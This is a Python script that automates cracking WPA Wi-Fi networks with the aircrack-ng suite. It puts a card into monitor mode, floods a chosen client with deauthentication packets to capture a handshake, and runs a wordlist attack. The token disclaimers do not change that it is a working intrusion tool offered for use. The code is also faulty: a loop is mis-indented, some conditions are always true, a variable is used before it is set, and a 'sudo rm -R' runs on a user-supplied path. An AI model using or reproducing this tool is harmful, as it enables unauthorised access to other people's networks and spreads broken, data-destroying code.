#AutomaticCRR is a command line software running under linux, its goal is to simplify the cracking of wifi networks. 
#This software has not been developed in any case to introduce wifi networks not belonging to you.
#I'm in any case responsable of your usage
#Developped by Nux 404


import os 
import time

aireplay = 0
HANDSHAKE = ""

os.system("clear")

print("I disclaim all responsibility for the use you make of my wifi cracking tool.")
time.sleep(0.9)
print("Please make sure that you are connect in super user mode (sudo -i) before launch the cracking.")
time.sleep(1)

PATH = input("Enter the path to install files : ")

PATH_Validity = os.path.exists(PATH)

while PATH_Validity != True:
	PATH_2 = input("Please enter a valid path : ")
	PATH_Validity = os.path.exists(f"{PATH_2}")
	PATH = PATH_2

os.system(f"cd {PATH}")

if not os.path.exists("AutomaticCRR"):
	os.makedirs(f"AutomaticCRR")

if os.path.exists("AutomaticCRR"):
	PATH = f"{PATH}AutomaticCRR/"
	os.system(f"cd {PATH}")
	if len(os.listdir(f"{PATH}")) != 0:
		print(f"All your data saved on the file {PATH} will be deleted (MANDATORY FOR PROGRAM USE).")
		rm = input("Do you want ton continue [Press enter to continue] : ")
		if rm == "":
			os.system(f"sudo rm -R {PATH}*")
		else:
			exit()

os.system("clear")

os.system("airmon-ng")
INTERFACE = input("Enter the interface of your network card : ")
	
os.system(f"airmon-ng start {INTERFACE}")
os.system("clear")
os.system("airmon-ng")

INTERFACE_2 = input("Retape the interface of your network card : ")
os.system("clear")

os.system(f"gnome-terminal -- airodump-ng {INTERFACE_2}")

BSSID = input("Enter the BSSID to crack : ")
time.sleep(3)
CHANNEL = input("Enter the CHANNEL of the network to crack : ")

os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE_2}")
time.sleep(12)

STATION = input("Enter the STATION of the network to crack : ")
os.system("clear")

while aireplay != 100:
	aireplay = aireplay + 1
	os.system(f"aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")

while  HANDSHAKE =="n" or "N":
	HANDSHAKE = input(f'Is the sentence "WPA HANSHAKE : {BSSID}" is displayed in the first page open ? [y/n] : ')
	if retry_HANDSHAKE != "y" or "Y":
		while aireplay != 100:
		aireplay = 0
		aireplay = aireplay + 1
		os.system(f"aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")
	retry_HANDSHAKE = input("The sentence has appared ? [y/n]")
	if retry_HANDSHAKE == "y" or "Y":
		break
	else:
		continue

time.sleep(1)
os.system("clear")

PATH_LST = input("Enter the list directory : ")
PATH_Validity = os.path.exists(PATH_LST)

while PATH_Validity != True:
	PATH_2 = input("Please enter a valid path : ")
	PATH_Validity = os.path.exists(f"{PATH_2}")
	PATH_LST = PATH_2

os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")

retry = input("Do you want to try again with another list ? [y/n] : ")
retry = str(retry)
if retry == "y" or "Y":
	PATH_LST_RETRY = input("Enter the list directory : ")
	os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST_RETRY} {PATH}-01.cap")
else:
	exit()

time.sleep(0.3)
